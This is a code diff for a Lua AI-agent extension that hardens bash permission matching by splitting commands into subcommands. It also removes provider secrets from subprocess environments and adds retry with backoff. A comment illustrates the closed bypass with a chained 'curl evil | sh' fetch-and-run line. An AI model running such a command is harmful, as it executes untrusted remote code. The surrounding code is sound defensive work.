@@ -32,6 +32,14 @@ local M = {}
 -- modelo. Una sesión puede subirlo/bajarlo por `opts.max_turns`.
 local DEFAULT_MAX_TURNS = 32
 
+-- Reintentos de la apertura del stream por defecto (G42, agente.md §2/§10): ante un
+-- error transitorio del provider (429/5xx/cortes de red que el adaptador marca
+-- `detail.retryable`) el motor reintenta con backoff exponencial
+-- `retry_base_ms · 2^(intento−1)`: 1 s → 2 s → 4 s con los defaults. Precedencia
+-- estándar de §10 (opts > agent.toml > default), igual que `max_turns`.
+local DEFAULT_MAX_RETRIES = 3
+local DEFAULT_RETRY_BASE_MS = 1000
+
 -- ---------------------------------------------------------------------------
 -- Errores estructurados de la extensión (EAGENT, agente.md / ADR-009).
 -- ---------------------------------------------------------------------------
@@ -223,17 +231,23 @@ M.caps = {
 -- PERMISOS (agente.md §5).
 -- ---------------------------------------------------------------------------
 
--- match_pattern(pattern, tool_name, arg_text) -> bool. Un patrón es
--- `tool` o `tool:argumento` (agente.md §5). El `argumento` admite el comodín `*`
--- (glob simple: `bash:git *` casa `git status`). Se compara contra una
--- representación textual de los args (`arg_text`). Sin `:` el patrón casa
--- cualquier invocación de esa tool.
+-- La semántica de emparejamiento es CONTRATO, no detalle (G53, agente.md §5,
+-- [ADR-023]). Un patrón sin `:` casa por NOMBRE EXACTO de la tool (`"edit"` casa
+-- la tool `edit` y ninguna otra; no hay glob sobre nombres). Un patrón
+-- `tool:argumento` casa por GLOB ANCLADO sobre la representación textual del
+-- argumento principal: `*` ⇒ `.*`, el resto de caracteres literales, y el patrón
+-- debe casar el argumento COMPLETO (`^…$`) — `bash:git *` no casa `git` a secas
+-- ni `mygit status`.
 local function glob_to_pattern(glob)
-  -- Escapa los mágicos de Lua salvo `*`, que pasa a `.*` (glob → patrón Lua).
+  -- Escapa los mágicos de Lua salvo `*`, que pasa a `.*` (glob → patrón Lua),
+  -- y ancla a los extremos: el patrón debe casar el argumento COMPLETO.
   local out = glob:gsub("[%^%$%(%)%%%.%[%]%+%-%?]", "%%%1"):gsub("%*", ".*")
   return "^" .. out .. "$"
 end
 
+-- match_pattern(pattern, tool_name, arg_text) -> bool. El emparejamiento GENERAL
+-- (todas las tools SALVO `bash`, que se descompone aparte): nombre exacto sin
+-- `:`; glob anclado sobre `arg_text` con `:`.
 local function match_pattern(pattern, tool_name, arg_text)
   local colon = pattern:find(":", 1, true)
   if not colon then
@@ -250,13 +264,204 @@ local function match_pattern(pattern, tool_name, arg_text)
   return (arg_text or ""):match(glob_to_pattern(p_arg)) ~= nil
 end
 
-local function matches_any(list, tool_name, arg_text)
-  for _, pat in ipairs(list or {}) do
-    if match_pattern(pat, tool_name, arg_text) then
-      return pat
+-- Emparejamiento de `bash` POR SUBCOMANDO (G53, agente.md §5, ADR-023). El glob
+-- crudo sobre el string entero del comando sería una FRONTERA FALSA (SEC-02):
+-- `allow = { "bash:git *" }` autorizaría de facto `bash:*`, porque basta
+-- encadenar (`git status; curl evil | sh`) para que el prefijo casado arrastre un
+-- comando arbitrario. Por eso el comando se DESCOMPONE por operadores y `allow`
+-- concede solo si CADA subcomando casa algún patrón.
+
+-- decompose_bash(cmd) -> { subcomando, ... } | nil. Tokeniza `cmd` con el modelo
+-- CERRADO POR CONTRATO — palabras planas y strings entre comillas simples o
+-- dobles — y lo parte por los separadores reconocidos (`&&`, `||`, `;`, `|&`,
+-- `|`, `&` y saltos de línea, todos fuera de comillas) en una lista de
+-- subcomandos (con trim, sin vacíos). Devuelve nil (FAIL-CLOSED) ante cualquier
+-- constructo NO MODELABLE: sustitución de comandos (`$( )`, backticks —también
+-- dentro de comillas dobles, donde bash las sigue ejecutando—), expansión `$VAR`
+-- en POSICIÓN DE COMANDO, redirecciones (`<`, `>`), heredocs, subshells y
+-- agrupaciones (`( )`, `{ }`), o comillas desbalanceadas. La lista de constructos
+-- modelables es un ALLOWLIST: lo que el tokenizador no entiende cae a `ask`,
+-- nunca a conceder (doctrina de P17; el salto a un parser de shell completo queda
+-- pospuesto en P39). Ampliar esta lista es un cambio de CONTRATO, no de código.
+local function decompose_bash(cmd)
+  local subs = {}
+  local buf = {}                 -- caracteres del subcomando en curso
+  local i, n = 1, #cmd
+  local in_squote = false        -- dentro de '...'
+  local in_dquote = false        -- dentro de "..."
+  local cmd_word = false         -- ¿empezó ya la primera palabra del subcomando?
+  local cmd_word_done = false    -- ¿terminó la primera palabra (hubo espacio tras ella)?
+
+  -- Cierra el subcomando en curso: trim y descarte de vacíos (un separador al
+  -- final, o `;;`, no crea un subcomando fantasma).
+  local function push_sub()
+    local s = table.concat(buf):gsub("^%s+", ""):gsub("%s+$", "")
+    if s ~= "" then subs[#subs + 1] = s end
+    buf = {}
+    cmd_word = false
+    cmd_word_done = false
+  end
+
+  while i <= n do
+    local c = cmd:sub(i, i)
+    if in_squote then
+      -- Comillas simples: literal absoluto en bash — ni escapes ni expansión;
+      -- solo `'` cierra. Un separador aquí dentro NO parte (`echo 'a; b'` es uno).
+      if c == "'" then in_squote = false end
+      buf[#buf + 1] = c
+      i = i + 1
+    elseif in_dquote then
+      -- Comillas dobles: `\` escapa el siguiente char, `"` cierra, y `$( )`/
+      -- backticks SIGUEN ejecutando dentro → no modelables (el resto —`$VAR`,
+      -- `${VAR}`— es literal opaco para el glob).
+      if c == "\\" then
+        buf[#buf + 1] = c
+        if i < n then buf[#buf + 1] = cmd:sub(i + 1, i + 1) end
+        i = i + 2
+      elseif c == "`" then
+        return nil               -- sustitución con backticks (ejecuta en dobles)
+      elseif c == "$" and cmd:sub(i + 1, i + 1) == "(" then
+        return nil               -- $( ) command substitution (ejecuta en dobles)
+      else
+        if c == '"' then in_dquote = false end
+        buf[#buf + 1] = c
+        i = i + 1
+      end
+    else
+      -- Fuera de comillas: aquí viven los separadores y los constructos no
+      -- modelables. El orden importa: los operadores de dos caracteres antes que
+      -- los de uno.
+      if c == "\\" then
+        -- Escape: el siguiente char es literal (no separa ni abre comillas). Sin
+        -- esto, un `\"` engañaría al rastreador de comillas y podría tragarse un
+        -- separador — bajo-rechazo peligroso.
+        cmd_word = true
+        buf[#buf + 1] = c
+        if i < n then buf[#buf + 1] = cmd:sub(i + 1, i + 1) end
+        i = i + 2
+      elseif c == "'" then
+        in_squote = true; cmd_word = true; buf[#buf + 1] = c; i = i + 1
+      elseif c == '"' then
+        in_dquote = true; cmd_word = true; buf[#buf + 1] = c; i = i + 1
+      elseif c == "\n" or c == ";" then
+        push_sub(); i = i + 1                       -- separador: salto de línea / `;`
+      elseif c == "&" then
+        if cmd:sub(i + 1, i + 1) == "&" then i = i + 1 end
+        push_sub(); i = i + 1                       -- `&&` o `&` (background)
+      elseif c == "|" then
+        local nx = cmd:sub(i + 1, i + 1)
+        if nx == "|" or nx == "&" then i = i + 1 end
+        push_sub(); i = i + 1                       -- `||`, `|&` o `|`
+      elseif c == "`" then
+        return nil                                  -- sustitución con backticks
+      elseif c == "(" or c == ")" or c == "{" or c == "}" then
+        return nil                                  -- subshell/agrupación (y `$( )`, `${ }`)
+      elseif c == "<" or c == ">" then
+        return nil                                  -- redirección / heredoc
+      elseif c == "$" and not cmd_word_done then
+        return nil                                  -- `$VAR` en posición de comando
+      else
+        if c:match("%s") then
+          if cmd_word then cmd_word_done = true end -- fin de la primera palabra
+        else
+          cmd_word = true
+        end
+        buf[#buf + 1] = c; i = i + 1
+      end
     end
   end
+
+  if in_squote or in_dquote then
+    return nil                    -- comillas desbalanceadas
+  end
+  push_sub()
+  return subs
+end
+
+-- match_bash(list, cmd, require_all) -> patrón | nil. Aplica la semántica por
+-- subcomando a la lista de política. `require_all` = true (allow) concede solo si
+-- CADA subcomando casa algún patrón `bash:arg` de la lista; false (deny) casa si
+-- ALGÚN subcomando casa. Un patrón `bash` a secas (sin `:`, nombre exacto de la
+-- tool) cubre CUALQUIER comando y cortocircuita. Ante un comando no modelable
+-- devuelve nil: allow no concede (fail-closed) y deny —best-effort, doctrina
+-- G16— no puede inspeccionar subcomandos, así que la petición sigue el pipeline
+-- (ask; en headless, deny), nunca hacia conceder.
+local function match_bash(list, cmd, require_all)
+  -- `bash` a secas casa la tool entera: cortocircuita (nombre exacto).
+  for _, pat in ipairs(list or {}) do
+    if pat == "bash" then return "bash" end
+  end
+  -- Recoge los globs anclados de los patrones `bash:arg`.
+  local globs = {}
+  for _, pat in ipairs(list or {}) do
+    local colon = pat:find(":", 1, true)
+    if colon and pat:sub(1, colon - 1) == "bash" then
+      globs[#globs + 1] = { pat = pat, rx = glob_to_pattern(pat:sub(colon + 1)) }
+    end
+  end
+  if #globs == 0 then return nil end
+
+  local subs = decompose_bash(cmd or "")
+  if subs == nil or #subs == 0 then return nil end  -- no modelable / vacío
+
+  if require_all then
+    -- allow: CADA subcomando debe casar algún glob. Devuelve un patrón que casó.
+    local hit = nil
+    for _, s in ipairs(subs) do
+      local ok = false
+      for _, g in ipairs(globs) do
+        if s:match(g.rx) then ok = true; hit = hit or g.pat; break end
+      end
+      if not ok then return nil end
+    end
+    return hit or globs[1].pat
+  else
+    -- deny: ALGÚN subcomando que case basta (precedencia absoluta en el pipeline).
+    for _, s in ipairs(subs) do
+      for _, g in ipairs(globs) do
+        if s:match(g.rx) then return g.pat end
+      end
+    end
+    return nil
+  end
+end
+
+-- match_policy(list, tool_name, atext, require_all) -> patrón | nil. Despacha
+-- entre la descomposición por subcomando de `bash` y el emparejamiento general
+-- del resto de tools.
+local function match_policy(list, tool_name, atext, require_all)
+  if tool_name == "bash" then
+    return match_bash(list, atext, require_all)
+  end
+  for _, pat in ipairs(list or {}) do
+    if match_pattern(pat, tool_name, atext) then return pat end
+  end
   return nil
+end
+
+-- suggested_for(tool_name, atext) -> string | { string, ... }. El/los patrón(es)
+-- `allow` accionables (amortiguador 2 de §5, portador `suggested` de G40). Para un
+-- `bash` COMPUESTO (≥2 subcomandos) devuelve una LISTA con un patrón por
+-- subcomando — la UX de "permitir siempre" persiste reglas por subcomando, no el
+-- string encadenado (P29): reutilizables y auditables una a una. Un bash de un
+-- solo subcomando, un bash no modelable, o cualquier otra tool devuelven el
+-- string `tool:arg` de siempre.
+local function suggested_for(tool_name, atext)
+  if tool_name == "bash" and atext ~= "" then
+    local subs = decompose_bash(atext)
+    if subs and #subs >= 2 then
+      local out = {}
+      for _, s in ipairs(subs) do out[#out + 1] = "bash:" .. s end
+      return out
+    elseif subs and #subs == 1 then
+      return "bash:" .. subs[1]
+    end
+    -- no modelable: cae al string entero de abajo.
+  end
+  if atext ~= "" then
+    return tool_name .. ":" .. atext
+  end
+  return tool_name
 end
 
 -- arg_text(tool_name, args) -> string. Representación textual de los args para
@@ -269,6 +474,28 @@ local function arg_text(tool_name, args)
   end
   return tostring(args.command or args.cmd or args.path or args.file or "")
 end
+
+-- policy_decision(perms, tool_name, atext) -> verdict, patrón?. El núcleo de la
+-- política DECLARADA (los dos primeros pasos del pipeline de §5): `deny` corta,
+-- luego `allow` concede. Devuelve "deny"+patrón, "allow", o "pass" (ni una ni
+-- otra: sigue a hooks/ask/headless). Extraído de check_permission para que los
+-- tests de G53 ejerciten la semántica de emparejamiento table-driven sin montar
+-- una sesión entera.
+local function policy_decision(perms, tool_name, atext)
+  -- deny casa si ALGÚN subcomando casa (bash) o el glob general (resto).
+  local denied = match_policy(perms.deny, tool_name, atext, false)
+  if denied then return "deny", denied end
+  -- allow concede si CADA subcomando casa (bash) o el glob general (resto).
+  if match_policy(perms.allow, tool_name, atext, true) then return "allow" end
+  return "pass"
+end
+
+-- Ganchos de prueba (no forman parte del contrato público, cf. `M._reset_hooks`):
+-- exponen la maquinaria de emparejamiento de G53 para tests table-driven que
+-- blindan la MISMA función que corre el pipeline.
+M._policy_decision = policy_decision
+M._decompose_bash = decompose_bash
+M._suggested_for = suggested_for
 
 -- pending_asks: asks pendientes por id, cada uno con su `future` (G3: varias
 -- sesiones pueden tener asks a la vez; cada una espera SIN timeout). La UI/chat
@@ -348,15 +575,15 @@ local function check_permission(session, tool, args)
   end
   -- Una tool con default="deny" se deniega salvo allow explícito (se evalúa abajo).
 
-  -- 2. deny de la política corta (agente.md §5: deny → allow → hooks).
-  local denied = matches_any(perms.deny, name, atext)
-  if denied then
+  -- 2-3. Política declarada (agente.md §5: deny → allow → hooks). deny corta con
+  -- precedencia absoluta; allow concede. Para `bash`, deny casa si ALGÚN
+  -- subcomando casa y allow solo si CADA subcomando casa (un constructo no
+  -- modelable cae fail-closed y no concede) — el núcleo vive en policy_decision.
+  local verdict, denied = policy_decision(perms, name, atext)
+  if verdict == "deny" then
     return false, string.format("permiso denegado por `deny = {%q}` para la tool %q", denied, name),
       { tool = name, source = "deny", pattern = denied }
-  end
-
-  -- 3. allow de la política concede.
-  if matches_any(perms.allow, name, atext) then
+  elseif verdict == "allow" then
     return true
   end
 
@@ -373,12 +600,12 @@ local function check_permission(session, tool, args)
     return true
   end
 
-  -- 5. Nadie decidió. El patrón ACCIONABLE a añadir (amortiguador 2).
-  local suggested = name
-  if atext ~= "" then
-    suggested = name .. ":" .. atext
-  end
-  local action = string.format("denegado %q; concédelo con allow = {%q} (o ejecuta con --auto-permissions)", name, suggested)
+  -- 5. Nadie decidió. El/los patrón(es) ACCIONABLE(s) a añadir (amortiguador 2).
+  -- Para un `bash` compuesto, `suggested` es una LISTA por subcomando (P29); la
+  -- prosa `action` usa una representación textual del primero de esos patrones.
+  local suggested = suggested_for(name, atext)
+  local action_pat = type(suggested) == "table" and (suggested[1] or name) or suggested
+  local action = string.format("denegado %q; concédelo con allow = {%q} (o ejecuta con --auto-permissions)", name, action_pat)
 
   if tool.default == "deny" then
     return false, "la tool está registrada con default = \"deny\"; " .. action,
@@ -417,7 +644,8 @@ end
 
 -- load_config() -> tabla lee `config.dir()/agent.toml` (agente.md §10) de forma
 -- perezosa y cacheada. Ausente → defaults. Mal formado → EAGENT accionable. Solo
--- lee los campos v1 que esta sesión usa: `model`, `max_turns`, `permissions`.
+-- lee los campos v1 que esta sesión usa: `model`, `max_turns`, `max_retries`,
+-- `retry_base_ms` (reintentos de la apertura del stream, G42), `permissions`.
 local config_cache = nil
 local function load_config()
   if config_cache ~= nil then
@@ -444,6 +672,73 @@ end
 -- M.reload_config() invalida la caché de `agent.toml`.
 function M.reload_config()
   config_cache = nil
+end
+
+-- ---------------------------------------------------------------------------
+-- Higiene del entorno de subprocesos (G55, agente.md §3, SEC-04).
+-- ---------------------------------------------------------------------------
+
+-- bash_env_prefix() -> string[]. Los tokens `"-u", "VAR", ...` que, antepuestos
+-- a `env --` delante del comando REAL, hacen que el hijo NO herede las variables
+-- de `providers.secret_env_vars()` (providers.md §4) salvo que el usuario haya
+-- hecho opt-in nominal con `[tools.bash] inherit_secrets = ["VAR", ...]` en SU
+-- `agent.toml` (`config.dir()/agent.toml`, la única config que `load_config`
+-- lee — el `agent.toml` del repo aún no se lee en absoluto, §11; los `opts` de
+-- sesión no tienen forma de tocar esto, ni la tendrán, agente.md §3).
+--
+-- El mecanismo es el idioma `env -u` del SO, tal y como agente.md §3 lo fija:
+-- NO se toca `opts.env` de `enu.proc` (que REEMPLAZA el entorno entero por
+-- llamada, S16) porque la API no ofrece enumerar el entorno heredado para
+-- reconstruirlo menos las secretas — `env -u VAR -- cmd` expresa exactamente
+-- "todo lo heredado, salvo esto" sin necesitar esa enumeración.
+local function bash_env_prefix()
+  local secrets = providers.secret_env_vars()
+  if #secrets == 0 then
+    return {}
+  end
+  local cfg = load_config()
+  local inherit = (cfg.tools and cfg.tools.bash and cfg.tools.bash.inherit_secrets) or {}
+  if type(inherit) ~= "table" then
+    inherit = {} -- config mal formada: no concede nada (fail-closed, no EAGENT aquí)
+  end
+  local allowed = {}
+  for _, v in ipairs(inherit) do
+    allowed[v] = true
+  end
+  local prefix = {}
+  for _, var in ipairs(secrets) do
+    if not allowed[var] then
+      prefix[#prefix + 1] = "-u"
+      prefix[#prefix + 1] = var
+    end
+  end
+  return prefix
+end
+
+-- M._bash_subprocess_argv(argv) -> string[]. Envuelve `argv` (el comando REAL,
+-- ya como array — sin shell implícita, api.md §6) con el prefijo `env -u ...`
+-- de higiene de G55, para que CUALQUIER subproceso lanzado por la extensión
+-- (la tool `bash` de `tools_bash.lua`, hoy; otro lanzador futuro que quiera la
+-- MISMA higiene) recorte los secretos del provider por defecto. Expuesto en `M`
+-- (convención `M._foo` de ganchos internos, cf. `M._decompose_bash`) porque
+-- `tools_bash.lua` es un fichero distinto que solo ve la superficie pública.
+function M._bash_subprocess_argv(argv)
+  if type(argv) ~= "table" then
+    einval("_bash_subprocess_argv espera un array de argumentos")
+  end
+  local prefix = bash_env_prefix()
+  if #prefix == 0 then
+    return argv -- nada que recortar (sin providers con api_key_env declarada)
+  end
+  local out = { "env" }
+  for _, tok in ipairs(prefix) do
+    out[#out + 1] = tok
+  end
+  out[#out + 1] = "--"
+  for _, tok in ipairs(argv) do
+    out[#out + 1] = tok
+  end
+  return out
 end
 
 -- normalize_permissions(opts_perms, cfg) -> Permissions. Combina los permisos de
@@ -935,6 +1230,42 @@ function Session:send(content)
   return res.message
 end
 
+-- Session:retry() ⏸ -> Message (agente.md §2 "Reintento manual", G43). Re-ejecuta
+-- el turno sobre el HISTORIAL VIGENTE, SIN anexar mensaje nuevo — el camino de la
+-- acción de reintento de una UI tras un `agent:error` (el mensaje del usuario ya
+-- está en el historial; un `send` lo DUPLICARÍA). Reutiliza la maquinaria de `send`
+-- (task propia del turno + future del mensaje final) pero sin encolar contenido: en
+-- vez de un item en la cola —que `_drain_queue` anexaría como mensaje de usuario—,
+-- inscribe su waiter DIRECTO en `waiters`, que `_finish_turn` resuelve con el
+-- mensaje final igual que a un `send`. `EINVAL` accionable si hay turno en vuelo, la
+-- sesión está cerrada, o el historial está vacío (no hay nada que reintentar).
+function Session:retry()
+  if self.closed then
+    einval("no se puede reintentar: la sesión está cerrada")
+  end
+  if self.turn_active then
+    einval("no se puede reintentar: hay un turno en vuelo (espera a que termine o cancélalo)")
+  end
+  if #self.history == 0 then
+    einval("no se puede reintentar: el historial está vacío (no hay turno que re-ejecutar)")
+  end
+
+  self.turn_active = true
+  self._turn_done = false
+  self.waiters = {}
+  -- Waiter directo (sin cola): no hay contenido nuevo que inyectar, solo esperar el
+  -- mensaje final de este turno re-ejecutado.
+  local item = { fut = enu.task.future() }
+  self.waiters[#self.waiters + 1] = item
+  self.turn_task = enu.task.spawn(function() self:_turn_loop() end)
+
+  local res = item.fut:await()
+  if res.canceled then
+    return nil
+  end
+  return res.message
+end
+
 -- Session:_drain_queue() inyecta los mensajes encolados (G4): los anexa al
 -- historial/store como mensajes de usuario y mueve sus futures a `waiters` (para
 -- que resuelvan con el mensaje final de ESTE turno). Se llama al inicio de cada
@@ -989,6 +1320,45 @@ function Session:_finish_turn(canceled)
   end
 end
 
+-- stream_with_retry(session, adapter, request, provider_config) -> iter. Envuelve
+-- SOLO la APERTURA del stream (agente.md §2 paso 3, G42): la política de reintento
+-- vive aquí, nunca en el adaptador (providers.md §3 solo MARCA `detail.retryable`).
+-- Si `adapter.stream` lanza un error tabla con `detail.retryable == true` y quedan
+-- reintentos, espera con backoff exponencial (`retry_base_ms · 2^(intento−1)`),
+-- anuncia `agent:retry` y reintenta hasta `session.max_retries` veces. El backoff
+-- duerme con `enu.task.sleep`: un punto de suspensión normal, así que un
+-- `Session:cancel` durante la espera aborta el turno como siempre (S08). Agotados
+-- los reintentos —o un error no retryable / no tabla— relanza el error TAL CUAL,
+-- preservando la tabla (y su `retryable`, que G43 lleva hasta la UI). OJO: el
+-- CONSUMO del stream queda FUERA de este envoltorio: un fallo a mitad de stream ya
+-- pintó deltas y reintentar duplicaría contenido, así que propaga sin reintento.
+local function stream_with_retry(session, adapter, request, provider_config)
+  local attempt = 0
+  while true do
+    local ok, iter = pcall(adapter.stream, request, provider_config)
+    if ok then
+      return iter
+    end
+    local err = iter
+    local retryable = type(err) == "table" and type(err.detail) == "table"
+      and err.detail.retryable == true
+    if not retryable or attempt >= session.max_retries then
+      error(err) -- relanza tal cual: preserva la tabla estructurada (code/detail/retryable)
+    end
+    attempt = attempt + 1
+    local delay = session.retry_base_ms * (2 ^ (attempt - 1))
+    -- Un `agent:retry` por cada espera (§4): la UI no muestra segundos de nada.
+    emit(session.handle.id, "retry", {
+      attempt     = attempt,
+      max_retries = session.max_retries,
+      delay_ms    = delay,
+      code        = (type(err) == "table" and err.code) or nil,
+      message     = (type(err) == "table" and err.message) or tostring(err),
+    })
+    enu.task.sleep(delay)
+  end
+end
+
 -- Session:_turn_loop() es el cuerpo del turno (agente.md §2), corriendo en la
 -- task propia de la sesión. Registra su `cleanup` para cerrar limpio ante un
 -- aborto (P22), drena la cola (G4/P23) y autocompacta al rebasar el umbral (P25).
@@ -1013,9 +1383,16 @@ function Session:_turn_loop()
     self:_finish_turn(false)
     return
   end
+  -- El payload de `agent:error` lleva el error estructurado COMPLETO (G43): la UI
+  -- necesita `code` (distinguir un 401 accionable de un timeout) y `retryable`
+  -- (decidir si ofrece el reintento manual, `Session:retry`). `retryable` se ALZA
+  -- de `detail.retryable` a campo de primer nivel (la señal que toda UI mira). Es
+  -- un cambio aditivo: quien solo leía `message` sigue funcionando.
   local msg = (type(turn_err) == "table" and turn_err.message) or tostring(turn_err)
   local code = (type(turn_err) == "table" and turn_err.code) or nil
-  emit(self.handle.id, "error", { message = msg, code = code })
+  local detail = (type(turn_err) == "table" and turn_err.detail) or nil
+  local retryable = (type(detail) == "table" and detail.retryable) or nil
+  emit(self.handle.id, "error", { message = msg, code = code, retryable = retryable, detail = detail })
   self:_finish_turn(false)
 end
 
@@ -1110,8 +1487,9 @@ function Session:_run_turn_body()
     end
     request = hooked or request
 
-    -- Llama al adaptador y consume el stream (agente.md §2 pasos 3-4).
-    local iter = adapter.stream(request, provider_config)
+    -- Llama al adaptador y consume el stream (agente.md §2 pasos 3-4). La APERTURA
+    -- (paso 3) va envuelta en reintento con backoff (G42); el CONSUMO (paso 4) no.
+    local iter = stream_with_retry(self, adapter, request, provider_config)
     local done = consume_stream(self, iter)
 
     local assistant = done.message
@@ -1589,6 +1967,9 @@ function M.session(opts)
     history          = {},
     permissions      = normalize_permissions(opts.permissions, cfg),
     max_turns        = opts.max_turns or cfg.max_turns or DEFAULT_MAX_TURNS,
+    -- Reintentos de la apertura del stream (G42): precedencia estándar §10.
+    max_retries      = opts.max_retries or cfg.max_retries or DEFAULT_MAX_RETRIES,
+    retry_base_ms    = opts.retry_base_ms or cfg.retry_base_ms or DEFAULT_RETRY_BASE_MS,
     max_tokens       = opts.max_tokens,
     temperature      = opts.temperature,
     thinking         = thinking,
